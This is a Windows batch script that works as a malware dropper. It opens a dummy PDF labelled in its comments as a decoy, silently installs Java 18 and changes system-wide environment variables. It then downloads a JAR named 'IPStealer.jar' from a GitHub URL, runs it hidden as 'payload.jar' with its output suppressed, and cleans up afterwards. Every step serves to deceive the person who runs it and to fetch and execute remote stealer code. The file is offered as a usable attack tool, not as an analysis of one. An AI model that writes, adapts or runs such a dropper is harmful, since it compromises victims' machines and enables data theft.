@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

REM --- STEP 1: Open PDF Decoy (Silent) ---
start "" "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf"

REM --- STEP 2: Install Java 18 Silently ---
echo [*] Checking/Installing Java 18...
powershell -Command "$ProgressPreference='SilentlyContinue'; $javaUrl='https://download.oracle.com/java/18/archive/jdk-18.0.2.1_windows-x64_bin.exe'; $tempJava='%TEMP%\jdk18_install.exe'; if(!(Test-Path $tempJava)){Invoke-WebRequest -Uri $javaUrl -OutFile $tempJava -Headers @{'Cookie'='oraclelicense=accept-securebackup-cookie'}}; Start-Process $tempJava -ArgumentList '/s INSTALLDIR=\"C:\\Java\\jdk-18\" REBOOT=Disable' -Wait -WindowStyle Hidden"

REM --- STEP 3: Set Java 18 as Default (Update PATH) ---
echo [*] Setting Java 18 as default...
powershell -Command "[Environment]::SetEnvironmentVariable('JAVA_HOME', 'C:\\Java\\jdk-18', 'Machine'); $path=[Environment]::GetEnvironmentVariable('Path', 'Machine'); if(!$path.Contains('C:\\Java\\jdk-18\\bin')){[Environment]::SetEnvironmentVariable('Path', $path+';C:\\Java\\jdk-18\\bin', 'Machine')}"

REM --- STEP 4: Download & Run Your JAR ---
echo [*] Downloading payload...
powershell -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/mavi30173-ai/mc-server/raw/main/IPStealer.jar' -OutFile '%TEMP%\payload.jar'"

echo [*] Executing payload...
set "JAVA_EXE=C:\Java\jdk-18\bin\java.exe"
if exist "%JAVA_EXE%" (
    "%JAVA_EXE%" -jar "%TEMP%\payload.jar" >nul 2>&1
) else (
    java -jar "%TEMP%\payload.jar" >nul 2>&1
)

REM --- STEP 5: Cleanup & Exit ---
timeout /t 2 /nobreak >nul
del "%TEMP%\jdk18_install.exe" 2>nul
exit
